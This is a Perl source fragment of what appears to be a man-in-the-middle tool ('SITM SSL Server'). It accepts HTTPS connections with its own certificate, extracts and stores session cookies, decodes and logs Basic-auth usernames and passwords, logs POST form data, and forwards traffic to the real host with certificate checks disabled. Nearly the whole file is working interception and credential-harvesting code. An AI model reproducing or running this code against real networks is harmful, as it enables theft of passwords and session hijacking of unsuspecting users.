sub Start_HTTP_SSL_Server_Thread {
    # creating a listening socket
    my $socket = IO::Socket::SSL->new(
        LocalAddr => '0.0.0.0',
        LocalPort => 8080,
        ReuseAddr => 1,
        Listen    => 100,
        SSL_cert_file => 'Certs/certificate.pem',
        SSL_key_file => 'Certs/key.pem',
    );
    AddLogInfo("cannot create socket $!\n") unless $socket;

    AddLogInfo("SITM SSL Server Running on port : 8080\n");
    my $client_socket;

    while($client_socket = $socket->accept())
    {
        my $t = threads->create({'context' => 'void'},\&Process_HTTPS,$client_socket);
    }
     
    $socket->close();
}

sub Process_HTTPS{
    # get information about a newly connected client
    my $client_socket = $_[0];
    my $host = "";
    my $client_address = $client_socket->peerhost();

    # read up to 1024 characters from the connected client
    my $data = "";
    my $posting = 0;
    my $log = 0;
    my $httpown_page;
    $client_socket->sysread($data, 1024);
    foreach my $sslline (split("\n",$data))
    {
        if ($sslline =~ /POST \//)
        {
            $posting = 1;
        }
        if ($sslline =~ m/(GET|POST)/)
        {
            my @page = split(" ",$sslline);
            if (GoodPage($page[1]))
            {
                $log = 1;
                $httpown_page=$page[1];
            }
            
        }
        elsif ($sslline =~ /Host: /)
        {
            my $tmp = $sslline;
            $tmp =~ s/Host: //;
            $tmp =~ s/\n//;
            $tmp =~ s/\r//;
            $host = $tmp;
        }
        elsif ($sslline =~ /Cookie: / && $host && $httpown_page)
        {
            my $httpown_cookie = substr $sslline, 8; 
            $httpown_cookie = CookieEncode($httpown_cookie);
            $Captured_Pages{"http://".$host.$httpown_page} = $httpown_cookie;
            AddLogInfo("[".$client_socket->peerhost()."][HTTPS][SESSION Cookie] http://".$host.$httpown_page."\n");
        }
        elsif ($sslline =~ m/Authorization: Basic/ && $host)
        {
            my $authcode = substr $sslline, 21; 
            my $base64decoded = decode_base64($authcode);
            AddLogInfo("[".$client_socket->peerhost()."][HTTPS][$host]Auth : $base64decoded\n");

        }
        elsif ($posting == 1 && $sslline eq "\r")
        {
            $posting++;
        }
        elsif ($posting == 2)
        {
            AddLogInfo("POST DATA : $sslline\n");
            my @tmp = split(/&/, $sslline);         
            foreach my $data (@tmp){
                if ($data =~ /=/)
                {
                    $data = uri_unescape($data);
                    $data =~ s/\+/ /g;
                    AddLogInfo("[".$client_socket->peerhost()."][POST] $host : $data\n");
                    #AddPassword("[".$client->peerhost()."][$host][HTTP/POST] Parameter : ".$data."");
                }
            }
        }
    }
   

    if ($host)
    {
        Handle_Client($client_socket,$host,$data);
    }
    shutdown($client_socket, 1);
    return 1;
}

sub Handle_Client {
    my ($client,$host,$data) = @_;
    AddLogInfo("Connection from : " . $client->peerhost(). " to : " .$host."\n");
    my $proxy = IO::Socket::SSL->new(
        PeerHost => $host,
        PeerPort => "https",

        SSL_verify_mode => SSL_VERIFY_NONE,

    ) or return 0;
    $proxy->syswrite($data);
    #AddLogInfo $tmp_data;
    while (my $cdata = <$proxy>)
    {
        $client->syswrite($cdata);
    }
    $proxy->close();
}

return 1;